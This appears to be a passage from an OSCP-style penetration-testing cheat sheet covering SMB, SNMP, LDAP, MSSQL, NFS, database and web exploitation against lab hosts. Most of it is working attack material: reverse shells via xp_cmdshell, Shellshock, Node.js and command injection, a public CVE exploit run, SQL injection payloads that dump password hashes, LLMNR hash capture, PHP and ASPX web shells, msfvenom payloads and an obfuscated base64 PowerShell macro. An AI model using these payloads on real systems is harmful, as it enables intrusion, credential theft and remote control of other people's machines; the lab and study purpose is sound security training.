smbmap -u null -p "" -H $ip -P 445 -x "ipconfig /all" 2>&1
````
rpcclient
````
rpcclient -U "" -N $ip
enumdomusers
enumdomgroups
queryuser 0x450
enumprinters
querydominfo
createdomuser
deletedomuser
lookupnames
lookupsids
lsaaddacctrights
lsaremoveacctrights
dsroledominfo
dsenumdomtrusts
````
enum4linux
````
enum4linux -a -M -l -d $ip 2>&1
enum4linux -a -u "" -p "" 192.168.180.71 && enum4linux -a -u "guest" -p "" $ip
````
crackmapexec
````
crackmapexec smb $ip
crackmapexec smb $ip -u "guest" -p ""
crackmapexec smb $ip --shares -u "guest" -p ""
crackmapexec smb $ip --shares -u "" -p ""
crackmapexec smb 10.1.1.68 -u 'guest' -p '' --users
````
smbclient
````
smbclient -U '%' -N \\\\<smb $ip>\\<share name>
smbclient -U 'guest' \\\\<smb $ip>\\<share name>
prompt off
recurse on
mget *
````
````
smbclient -U null -N \\\\<smb $ip>\\<share name>
````
````
protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED
smbclient -U '%' -N \\\\$ip\\<share name> -m SMB2
smbclient -U '%' -N \\\\$ip\\<share name> -m SMB3
````
##### smblient random port
````
smbclient -L \\192.168.214.125 -U "" -N -p 12445
Sharename       Type      Comment
        ---------       ----      -------
        Sarge       Disk      USERA Files
        IPC$            IPC       IPC Service (Samba 4.13.2)
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.214.125 failed (Error NT_STATUS_IO_TIMEOUT)
Unable to connect with SMB1 -- no workgroup available
````
````
smbclient '//192.168.214.125/Sarge' -p 12445
Password for [WORKGROUP\root]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> dir
````
#### IMAP port 143/993
##### Enumeration
````
nmap -p 143 --script imap-ntlm-info $ip
````
#### SNMP port 161 udp
````
sudo nmap --script snmp-* -sU -p161 $ip
sudo nmap -sU -p 161 --script snmp-brute $ip --script-args snmp-brute.communitiesdb=/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt
````
````
snmpwalk -c public -v1 $ip
````
##### Hacktricks
````
https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp
````
````
apt-get install snmp-mibs-downloader
sudo download-mibs
sudo vi /etc/snmp/snmp.conf
````
````
$ cat /etc/snmp/snmp.conf     
# As the snmp packages come without MIB files due to license reasons, loading
# of MIBs is disabled by default. If you added the MIBs you can reenable
# loading them by commenting out the following line.
#mibs :

# If you want to globally change where snmp libraries, commands and daemons
# look for MIBS, change the line below. Note you can set this for individual
# tools with the -M option or MIBDIRS environment variable.
#
# mibdirs /usr/share/snmp/mibs:/usr/share/snmp/mibs/iana:/usr/share/snmp/mibs/ietf
````
````
sudo snmpbulkwalk -c public -v2c $ip .
sudo snmpbulkwalk -c public -v2c $ip NET-SNMP-EXTEND-MIB::nsExtendOutputFull 
````
#### LDAP port Port 389,636,3268,3269
````
ldapsearch -x -H ldap://192.168.214.122

# extended LDIF
#
# LDAPv3
# base <> (default) with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 32 No such object
text: 0000208D: NameErr: DSID-0310021C, problem 2001 (NO_OBJECT), data 0, best 
 match of:
        ''


# numResponses: 1
````
````
ldapsearch -x -H ldap://192.168.214.122 -s base namingcontexts

# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingcontexts: DC=exampleH,DC=example
namingcontexts: CN=Configuration,DC=exampleH,DC=example
namingcontexts: CN=Schema,CN=Configuration,DC=exampleH,DC=example
namingcontexts: DC=DomainDnsZones,DC=exampleH,DC=example
namingcontexts: DC=ForestDnsZones,DC=exampleH,DC=example

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
````
````
ldapsearch -x -H ldap://192.168.214.122 -b "DC=exampleH,DC=example"
````
#### MSSQL port 1433
##### Enumeration
````
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 $ip
````
##### Crackmapexec
````
proxychains crackmapexec mssql -d example.com -u sql_service -p password123  -x "whoami" 10.10.126.148
proxychains crackmapexec mssql -d example.com -u sql_service -p password123  -x "whoami" 10.10.126.148 -q 'SELECT name FROM master.dbo.sysdatabases;'

````
##### Logging in
````
sqsh -S $ip -U sa -P CrimsonQuiltScalp193 #linux
proxychains sqsh -S 10.10.126.148 -U example.com\\sql_service -P password123 -D msdb #windows
````
##### Expliotation
````
EXEC SP_CONFIGURE 'show advanced options', 1
reconfigure
go
EXEC SP_CONFIGURE 'xp_cmdshell' , 1
reconfigure
go
xp_cmdshell 'whoami'
go
xp_cmdshell 'powershell "Invoke-WebRequest -Uri http://10.10.126.147:7781/rshell.exe -OutFile c:\Users\Public\reverse.exe"'
go
xp_cmdshell 'c:\Users\Public\reverse.exe"'
go
````
#### NFS port 2049
##### Enumeration
````
showmount $ip
showmount -e $ip
````
##### Mounting
````
sudo mount -o [options] -t nfs ip_address:share directory_to_mount
mkdir temp 
mount -t nfs -o vers=3 10.11.1.72:/home temp -o nolock
````
##### new user with new permissions
````
sudo groupadd -g 1014 <group name>
sudo groupadd -g 1014 1014
sudo useradd -u 1014 -g 1014 <user>
sudo useradd -u 1014 -g 1014 test
sudo passwd <user>
sudo passwd test
````
##### Changing permissions
The user cannot be logged in or active
````
sudo usermod -aG 1014 root
````
##### Changing owners
````
-rw------- 1 root root 3381 Sep 24  2020 id_rsa
````
````
sudo chown kali id_rsa
````
````
-rw------- 1 kali root 3381 Sep 24  2020 id_rsa
````

#### cgms? port 3003
##### Enumeration
````
nc -nv $ip 3003 #run this
````
````
help #run this
````
````
bins;build;build_os;build_time;cluster-name;config-get;config-set;digests;dump-cluster;dump-fabric;dump-hb;dump-hlc;dump-migrates;dump-msgs;dump-rw;dump-si;dump-skew;dump-wb-summary;eviction-reset;feature-key;get-config;get-sl;health-outliers;health-stats;histogram;jem-stats;jobs;latencies;log;log-set;log-message;logs;mcast;mesh;name;namespace;namespaces;node;physical-devices;quiesce;quiesce-undo;racks;recluster;revive;roster;roster-set;service;services;services-alumni;services-alumni-reset;set-config;set-log;sets;show-devices;sindex;sindex-create;sindex-delete;sindex-histogram;statistics;status;tip;tip-clear;truncate;truncate-namespace;truncate-namespace-undo;truncate-undo;version;
````
````
version #run this
````
````
Aerospike Community Edition build 5.1.0.1
````
##### Exploitation
````
wget https://raw.githubusercontent.com/b4ny4n/CVE-2020-13151/master/cve2020-13151.py
python3 cve2020-13151.py --ahost=192.168.208.143 --aport=3000 --pythonshell --lhost=192.168.45.208 --lport=443
nc -nlvp 443
````
#### MYSQL port 3306
##### Enumeration
````
nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 10.11.1.8 
````
#### RDP port 3389
##### Enumeration
````
nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 $ip -Pn
````
##### Password Spray
````
crowbar -b rdp -s 10.11.1.7/32 -U users.txt -C rockyou.txt
````
###### logging in
````
xfreerdp /cert-ignore /bpp:8 /compression -themes -wallpaper /auto-reconnect /h:1000 /w:1600 /v:192.168.238.191 /u:admin /p:password
xfreerdp /u:admin  /v:192.168.238.191 /cert:ignore /p:"password"  /timeout:20000 /drive:home,/tmp
````
#### Postgresql port 5432,5433
##### RCE
````
5437/tcp open  postgresql PostgreSQL DB 11.3 - 11.9
| ssl-cert: Subject: commonName=debian
| Subject Alternative Name: DNS:debian
| Not valid before: 2020-04-27T15:41:47
|_Not valid after:  2030-04-25T15:41:47
````
##### Searchsploit RCE
````
PostgreSQL 9.3-11.7 - Remote Code Execution (RCE) (Authenticated)
multiple/remote/50847.py
````
````
python3 50847.py -i 192.168.214.47 -p 5437 -c "busybox nc 192.168.45.191 80 -e sh"
````
#### Unkown Port
##### Enumeration
````
nc -nv $ip 4555
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
````
````
help #always run this after your nc -nv command
````
#### Passwords Guessed
````
root:root
admin@example.com:admin
admin:admin
USERK:USERK #name of the box
cassie:cassie #Found users with exiftool
````
## Web Pentest <img src="https://cdn-icons-png.flaticon.com/512/1304/1304061.png" width="40" height="40" />
### Nodes.js(express)
```
Send this request through burpsuite
```
![image](https://github.com/xsudoxx/OSCP/assets/127046919/1957806a-feed-4cbe-8f6f-d475ac99c48a)

````
POST /checkout HTTP/1.1

Host: 192.168.214.250:5000

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded

Content-Length: 90

Origin: http://192.168.214.250:5000

Connection: close

Referer: http://192.168.214.250:5000/checkout

Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE2ODUwNTc5MjR9.UgSoyjhtdOX00NmlbaJAuX8M3bjIMv3jXMFY_SnXpB8

Upgrade-Insecure-Requests: 1



full_name=Joshua&address=street+123&card=12345678897087696879&cvc=1234&date=1234&captcha=3`
````
![image](https://github.com/xsudoxx/OSCP/assets/127046919/2b8e361a-4a2a-43b1-a2fa-ed41b2c8a846)
````
This time add a ;
````
````
POST /checkout HTTP/1.1

Host: 192.168.214.250:5000

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded

Content-Length: 90

Origin: http://192.168.214.250:5000

Connection: close

Referer: http://192.168.214.250:5000/checkout

Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE2ODUwNTc5MjR9.UgSoyjhtdOX00NmlbaJAuX8M3bjIMv3jXMFY_SnXpB8

Upgrade-Insecure-Requests: 1



full_name=Joshua&address=street+123&card=12345678897087696879&cvc=1234&date=1234&captcha=3;
````

![image](https://github.com/xsudoxx/OSCP/assets/127046919/d9d57594-c10e-4755-b409-16d602a7f5f2)

````
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("sh", []);
    var client = new net.Socket();
    client.connect(80, "192.168.45.191", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();
````
````
POST /checkout HTTP/1.1

Host: 192.168.214.250:5000

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded

Content-Length: 90

Origin: http://192.168.214.250:5000

Connection: close

Referer: http://192.168.214.250:5000/checkout

Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE2ODUwNTc5MjR9.UgSoyjhtdOX00NmlbaJAuX8M3bjIMv3jXMFY_SnXpB8

Upgrade-Insecure-Requests: 1



full_name=Joshua&address=street+123&card=12345678897087696879&cvc=1234&date=1234&captcha=3;(function(){

    var net = require("net"),

        cp = require("child_process"),

        sh = cp.spawn("sh", []);

    var client = new net.Socket();

    client.connect(80, "192.168.45.191", function(){

        client.pipe(sh.stdin);

        sh.stdout.pipe(client);

        sh.stderr.pipe(client);

    });

    return /a/; // Prevents the Node.js application from crashing

})();
````
````
nc -nlvp 80  
listening on [any] 80 ...
connect to [192.168.45.191] from (UNKNOWN) [192.168.214.250] 46956
id
uid=1000(observer) gid=1000(observer) groups=1000(observer)
````
### Shellshock
````
nikto -ask=no -h http://10.11.1.71:80 2>&1
OSVDB-112004: /cgi-bin/admin.cgi: Site appears vulnerable to the 'shellshock' vulnerability
````
````
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/192.168.119.183/9001 0>&1'" \
http://10.11.1.71:80/cgi-bin/admin.cgi
````
### local File Inclusion
````
http://10.11.1.35/section.php?page=/etc/passwd
````
<img src="https://user-images.githubusercontent.com/127046919/227787857-bc760175-c5fb-47ce-986b-d15b8f59e555.png" width="480" height="250" />

#### Enumeration
````
userE@demon:/var/www/internal/backend/index.php #this file lives 5 directories deep.
127.0.0.1:8000/backend/?view=../../../../../etc/passwd #So you have to add 5 ../ in order to read the files you want
````

### Remote File Inclusion
````
http://10.11.1.35/section.php?page=http://192.168.119.168:80/hacker.txt
````

<img src="https://user-images.githubusercontent.com/127046919/227788184-6f4fed8d-9c8e-4107-bf63-ff2cbfe9b751.png" width="480" height="250" />

### Command Injection
#### DNS Querying Service
##### windows
For background the DNS Querying Service is running nslookup and then querying the output. The way we figured this out was by inputing our own IP and getting back an error that is similar to one that nslookup would produce. With this in mind we can add the && character to append another command to the query:
````
&& whoami
````

<img src="https://user-images.githubusercontent.com/127046919/223560695-218399e2-2447-4b67-b93c-caee8e3ee3df.png" width="250" height="240" />

````
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your kali IP> LPORT=<port you designated> -f exe -o ~/shell.exe
python3 -m http.server 80
&& certutil -urlcache -split -f http://<your kali IP>/shell.exe C:\\Windows\temp\shell.exe
nc -nlvp 80
&& cmd /c C:\\Windows\\temp\\shell.exe
````
#### snmp manager
##### linux
````
For background on this box we had a snmp manager on port 4080 using whatweb i confirmed this was linux based. Off all of this I was able to login as admin:admin just on guessing the weak creds. When I got in I looked for random files and got Manager router tab which featured a section to ping the connectivity of the routers managed.
````
````
10.1.1.95:4080/ping_router.php?cmd=192.168.0.1
````
````
10.1.1.95:4080/ping_router.php?cmd=$myip
tcpdump -i tun0 icmp
````
````
10.1.1.95:4080/ping_router.php?cmd=192.168.119.140; wget http://192.168.119.140:8000/test.html
python3 -m http.server 8000
tcpdump -i tun0 icmp
````
````
10.1.1.95:4080/ping_router.php?cmd=192.168.119.140; python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.119.140",22));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
nc -nlvp 22
````

### SQL Injection
#### Reference page
````
https://github.com/swisskyrepo/PayloadsAllTheThings
````
#### Testing sqli in every input field
````
';#---
````
#### MSSQL login page injection
##### Reference page
````
https://www.tarlogic.com/blog/red-team-tales-0x01/
````
````
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md#mssql-command-execution
````
##### Exploitation
````
';EXEC master.dbo.xp_cmdshell 'ping 192.168.119.184';--
';EXEC master.dbo.xp_cmdshell 'certutil -urlcache -split -f http://192.168.119.184:443/shell.exe C:\\Windows\temp\shell.exe';--
';EXEC master.dbo.xp_cmdshell 'cmd /c C:\\Windows\\temp\\shell.exe';--
````
#### SQL and php login page
##### vulnerable code

````
found a db.php file/directory. In this case fuzzed with ffuf, the example in our ffuf bruteforcing login pages will help on this
````

````
<?php

include 'dbconnection.php';
$userid = $_POST['userid'];
$password = $_POST['password'];
$sql =
"SELECT * FROM users WHERE username = '$userid' AND password = '$password'";
$result = mysqli_query($db, $sql) or die(mysqli_error($db));
$num = mysqli_fetch_array($result);
	
if($num > 0) {
	echo "Login Success";
}
else {
	echo "Wrong User id or password";
}
?>
````
##### php sql login by pass

````
admin' -- ' --
````
#### Research Repo MariaDB

<img src="https://user-images.githubusercontent.com/127046919/224163239-b67fbb66-e3b8-4ea4-8437-d0fe2839a166.png" width="250" height="240" />

````
Background information on sqli: scanning the network for different services that may be installed. A mariaDB was installed however the same logic can be used depending on what services are running on the network
````

````
admin ' OR 1=1 --
````

````
1' OR 1 = 1#
````
#### Oracle DB bypass login

````
admin ' OR 1=1 --
````
#### Oracle UNION DB dumping creds

````
https://web.archive.org/web/20220727065022/https://www.securityidiots.com/Web-Pentest/SQL-Injection/Union-based-Oracle-Injection.html
````

````
' 
Something went wrong with the search: java.sql.SQLSyntaxErrorException: ORA-01756: quoted string not properly terminated 
' OR 1=1 -- #query
Blog entry from USERA with title The Great Escape from 2017
Blog entry from USERB with title I Love Crypto from 2016
Blog entry from USERC with title Man-in-the-middle from 2018
Blog entry from USERA with title To Paris and Back from 2019
Blog entry from Maria with title Software Development Lifecycle from 2018
Blog entry from Eric with title Accounting is Fun from 2019
' union select 1,2,3,4,5,6-- #query
java.sql.SQLSyntaxErrorException: ORA-00923: FROM keyword not found where expected
 ' union select 1,2,3,4,5,6 from dual-- #Adjust for more or less columns
java.sql.SQLSyntaxErrorException: ORA-01789: query block has incorrect number of result columns
 ' union select 1,2,3 from dual-- #adjusted columns
java.sql.SQLSyntaxErrorException: ORA-01790: expression must have same datatype as corresponding expression ORA-01790: expression must have same datatype as corresponding expression 
 ' union select null,null,null from dual-- #query
Blog entry from null with title null from 0
' union select user,null,null from dual-- #query
Blog entry from example_APP with title null from 0
' union select table_name,null,null from all_tables-- #query
Blog entry from example_ADMINS with title null from 0
Blog entry from example_CONTENT with title null from 0
Blog entry from example_USERS with title null from 0
' union select column_name,null,null from all_tab_columns where table_name='example_ADMINS'-- #query
Blog entry from ADMIN_ID with title null from 0
Blog entry from ADMIN_NAME with title null from 0
Blog entry from PASSWORD with title null from 0
' union select ADMIN_NAME||PASSWORD,null,null from example_ADMINS-- #query
Blog entry from admind82494f05d6917ba02f7aaa29689ccb444bb73f20380876cb05d1f37537b7892 with title null from 0
````

#### MSSQL Error DB dumping creds
##### Reference Sheet

````
https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/
````

<img src="https://user-images.githubusercontent.com/127046919/228388326-934cba2a-2a41-42f2-981f-3c68cbaec7da.png" width="400" height="240" />

##### Example Case

````
' #Entered
Unclosed quotation mark after the character string '',')'. #response
````
###### Visualize the SQL statement being made

````
insert into dbo.tablename ('',''); 
#two statements Username and Email. Web Server says User added which indicates an insert statement
#we want to imagine what the query could potentially look like so we did a mock example above
insert into dbo.tablename (''',); #this would be created as an example of the error message above
````
##### Adjusting our initial Payload

````
insert into dbo.tablename ('1 AND 1=CONVERT(INT,@@version))--' ,''); #This is what is looks like
insert into dbo.tablename('',1 AND 1=CONVERT(INT,@@version))-- #Correct payload based on the above
',1 AND 1=CONVERT(INT,@@version))-- #Enumerate the DB
Server Error in '/Newsletter' Application.#Response
Incorrect syntax near the keyword 'AND'. #Response
',CONVERT(INT,@@version))-- #Corrected Payoad to adjust for the error
````
##### Enumerating DB Names

````
', CONVERT(INT,db_name(1)))--
master
', CONVERT(INT,db_name(2)))--
tempdb
', CONVERT(INT,db_name(3)))--
model
', CONVERT(INT,db_name(4)))--
msdb
', CONVERT(INT,db_name(5)))--
newsletter
', CONVERT(INT,db_name(6)))--
archive
````
##### Enumerating Table Names

````
', CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 TABLE_NAME FROM (SELECT DISTINCT top 1 TABLE_NAME FROM archive.information_schema.TABLES ORDER BY TABLE_NAME ASC) sq ORDER BY TABLE_NAME DESC)+CHAR(58))))--
pEXAMPLE
````
##### Enumerating number of Columns in selected Table

````
', CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 CAST(COUNT(*) AS nvarchar(4000)) FROM archive.information_schema.COLUMNS WHERE TABLE_NAME='pEXAMPLE')+CHAR(58)+CHAR(58))))--
3 entries
````
##### Enumerate Column Names

````
', CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 column_name FROM (SELECT DISTINCT top 1 column_name FROM archive.information_schema.COLUMNS WHERE TABLE_NAME='pEXAMPLE' ORDER BY column_name ASC) sq ORDER BY column_name DESC)+CHAR(58))))--
alogin

', CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 column_name FROM (SELECT DISTINCT top 2 column_name FROM archive.information_schema.COLUMNS WHERE TABLE_NAME='pEXAMPLE' ORDER BY column_name ASC) sq ORDER BY column_name DESC)+CHAR(58))))--
id

', CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 column_name FROM (SELECT DISTINCT top 3 column_name FROM archive.information_schema.COLUMNS WHERE TABLE_NAME='pEXAMPLE' ORDER BY column_name ASC) sq ORDER BY column_name DESC)+CHAR(58))))--
psw
````
##### Enumerating Data in Columns

````
', CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 psw FROM (SELECT top 1 psw FROM archive..pEXAMPLE ORDER BY psw ASC) sq ORDER BY psw DESC)+CHAR(58)+CHAR(58))))--
3c744b99b8623362b466efb7203fd182

', CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 psw FROM (SELECT top 2 psw FROM archive..pEXAMPLE ORDER BY psw ASC) sq ORDER BY psw DESC)+CHAR(58)+CHAR(58))))--
5b413fe170836079622f4131fe6efa2d

', CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 psw FROM (SELECT top 3 psw FROM archive..pEXAMPLE ORDER BY psw ASC) sq ORDER BY psw DESC)+CHAR(58)+CHAR(58))))--
7de6b6f0afadd89c3ed558da43930181

', CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 psw FROM (SELECT top 4 psw FROM archive..pEXAMPLE ORDER BY psw ASC) sq ORDER BY psw DESC)+CHAR(58)+CHAR(58))))--
cb2d5be3c78be06d47b697468ad3b33b
````
### llmnr-poisoning-responder
#### http
````
https://juggernaut-sec.com/llmnr-poisoning-responder/
````
````
responder -I tun0 -wv
````
![image](https://user-images.githubusercontent.com/127046919/233516797-36702551-f60a-4d0e-866a-7c3a8e2971c1.png)

````

[+] Listening for events...                                                                                                                                                                                                                 

[HTTP] Sending NTLM authentication request to 192.168.54.165
[HTTP] GET request from: ::ffff:192.168.54.165  URL: / 
[HTTP] NTLMv2 Client   : 192.168.54.165
[HTTP] NTLMv2 Username : HEIST\enox
[HTTP] NTLMv2 Hash     : enox::HEIST:4c153c5e0d81aee9:4F46F09B4B79350EA32DA7815D1F0779:01010000000000006E6BEC31EC73D90178BAF58029B083DD000000000200080039004F005500460001001E00570049004E002D00510042004A00560050004E004E0032004E0059004A000400140039004F00550046002E004C004F00430041004C0003003400570049004E002D00510042004A00560050004E004E0032004E0059004A002E0039004F00550046002E004C004F00430041004C000500140039004F00550046002E004C004F00430041004C000800300030000000000000000000000000300000C856F6898BEE6992D132CC256AC1C2292F725D1C9CB0A2BB6F2EA6DD672384220A001000000000000000000000000000000000000900240048005400540050002F003100390032002E003100360038002E00340039002E00350034000000000000000000
````
#### SMB
````
sudo responder -I tun0 -d -w
````
````
file://///<your $ip>/Share
````

![image](https://github.com/xsudoxx/OSCP/assets/127046919/a80cb512-fa68-4cf9-a8e1-565d70e52137)


![image](https://github.com/xsudoxx/OSCP/assets/127046919/2bb68b1f-70dc-4154-b961-3f42118b8495)


#### Cracking the hash
````
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
````
##### Hash
````
enox::HEIST:4c153c5e0d81aee9:4F46F09B4B79350EA32DA7815D1F0779:01010000000000006E6BEC31EC73D90178BAF58029B083DD000000000200080039004F005500460001001E00570049004E002D00510042004A00560050004E004E0032004E0059004A000400140039004F00550046002E004C004F00430041004C0003003400570049004E002D00510042004A00560050004E004E0032004E0059004A002E0039004F00550046002E004C004F00430041004C000500140039004F00550046002E004C004F00430041004C000800300030000000000000000000000000300000C856F6898BEE6992D132CC256AC1C2292F725D1C9CB0A2BB6F2EA6DD672384220A001000000000000000000000000000000000000900240048005400540050002F003100390032002E003100360038002E00340039002E00350034000000000000000000
````
### SSRF
SSRF vulnerabilities occur when an attacker has full or partial control of the request sent by the web application. A common example is when an attacker can control the third-party service URL to which the web application makes a request.

<img src="https://user-images.githubusercontent.com/127046919/224167289-d416f6b0-f256-4fd8-b7c2-bcdc3c474637.png" width="250" height="240" />

#### Example attack

````
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.146.172 - - [09/Mar/2023 16:39:17] code 404, message File not found
192.168.146.172 - - [09/Mar/2023 16:39:17] "GET /test.html HTTP/1.1" 404 -
````

````
http://192.168.119.146/test.html
http://192.168.119.146/test.hta
````

## Exploitation <img src="https://cdn-icons-png.flaticon.com/512/2147/2147286.png" width="40" height="40" />
### Windows rce techniques
````
cat shell.php                   
echo '<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>' > shell.php

http://<$Victim>/site/index.php?page=http://<Your $ip>:80/shell.php&cmd=ping <Your $ip>

tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
20:27:03.538792 IP 192.168.153.53 > 192.168.45.191: ICMP echo request, id 1, seq 1, length 40
20:27:03.539661 IP 192.168.45.191 > 192.168.153.53: ICMP echo reply, id 1, seq 1, length 40
````

````
locate nc.exe
impacket-smbserver -smb2support Share .
nc -nlvp 80
cmd.exe /c //<your kali IP>/Share/nc.exe -e cmd.exe <your kali IP> 80
````

````
cp /usr/share/webshells/asp/cmd-asp-5.1.asp . #IIS 5
ftp> put cmd-asp-5.1.asp
````

````
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your kali IP> LPORT=<port you designated> -f exe -o ~/shell.exe
python3 -m http.server 80
certutil -urlcache -split -f http://<your kali IP>/shell.exe C:\\Windows\temp\shell.exe
cmd /c C:\\Windows\\temp\\shell.exe
C:\inetpub\wwwroot\shell.exe #Path to run in cmd.aspx, click Run
````

````
cp /usr/share/webshells/aspx/cmdasp.aspx .
cp /usr/share/windows-binaries/nc.exe .
ftp> put cmdasp.aspx
impacket-smbserver -smb2support Share .
http://<target $ip>:<port>/cmdasp.aspx
nc -nlvp <port on your kali>
cmd.exe /c //192.168.119.167/Share/nc.exe -e cmd.exe <your kali $ip> <your nc port>
````

### HTA Attack in Action
We will use msfvenom to turn our basic HTML Application into an attack, relying on the hta-psh output format to create an HTA payload based on PowerShell. In Listing 11, the complete reverse shell payload is generated and saved into the file evil.hta.
````
msfvenom -p windows/shell_reverse_tcp LHOST=<your tun0 IP> LPORT=<your nc port> -f hta-psh -o ~/evil.hta
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your tun0 IP> LPORT=<your nc port> -f hta-psh -o ~/evil64.hta
````
### Exploiting Microsoft Office
When leveraging client-side vulnerabilities, it is important to use applications that are trusted by the victim in their everyday line of work. Unlike potentially suspicious-looking web links, Microsoft Office1 client-side attacks are often successful because it is difficult to differentiate malicious content from benign. In this section, we will explore various client-side attack vectors that leverage Microsoft Office applications
#### MSFVENOM
````
msfvenom -p windows/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f hta-psh -o shell.doc
````
#### Minitrue
````
https://github.com/X0RW3LL/Minitrue
cd /opt/WindowsMacros/Minitrue
./minitrue
select a payload: windows/x64/shell_reverse_tcp
select the payload type: VBA Macro
LHOST=$yourIP
LPORT=$yourPort
Payload encoder: None
Select or enter file name (without extensions): hacker
````
#### Microsoft Word Macro
The Microsoft Word macro may be one the oldest and best-known client-side software attack vectors.

Microsoft Office applications like Word and Excel allow users to embed macros, a series of commands and instructions that are grouped together to accomplish a task programmatically. Organizations often use macros to manage dynamic content and link documents with external content. More interestingly, macros can be written from scratch in Visual Basic for Applications (VBA), which is a fully functional scripting language with full access to ActiveX objects and the Windows Script Host, similar to JavaScript in HTML Applications.
````
Create the .doc file 
````
````
Use the base64 powershell code from revshells.com
````
````
Used this code to inline macro(Paste the code from revshells in str variable) :

str = "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEAMQA5AC4AMQA3ADQAIgAsADkAOQA5ADkAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBk